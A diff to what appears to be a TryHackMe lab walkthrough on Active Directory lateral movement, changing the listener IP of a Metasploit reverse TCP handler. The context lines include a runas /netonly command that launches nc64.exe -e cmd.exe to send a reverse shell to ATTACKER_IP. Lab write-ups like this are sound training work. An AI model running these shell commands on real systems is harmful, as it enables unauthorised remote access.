@@ -29,7 +29,7 @@ exploit(multi/handler) > set LPORT 4444
 exploit(multi/handler) > set payload windows/shell/reverse_tcp
 exploit(multi/handler) > exploit  
 
-Started reverse TCP handler on 10.10.10.16:4444</pre>
+Started reverse TCP handler on 10.50.119.158:4444</pre>
 
 - Spawn a reverse shell with t1_leonard.summers access (THMJMP2)
 <pre>runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "C:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"</pre>
